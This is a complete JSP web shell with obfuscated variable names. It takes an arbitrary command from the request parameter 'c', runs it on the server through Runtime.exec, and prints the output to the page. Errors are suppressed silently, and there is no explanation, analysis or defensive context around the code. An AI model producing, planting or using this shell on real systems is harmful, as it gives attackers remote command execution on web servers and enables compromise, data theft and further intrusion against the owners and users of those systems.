<%@ page import="java.util.*,java.io.*" %>
<%
try {
String zwvAqV = request.getParameter("c");
Process FPVQqG = Runtime.getRuntime().exec(zwvAqV);
DataInputStream ds = new DataInputStream(FPVQqG.getInputStream());
String ESOIw = ds.readLine();
while ( ESOIw != null ) {
  out.println(ESOIw); 
  ESOIw = ds.readLine(); 
}
} catch (Exception e) {}
%>
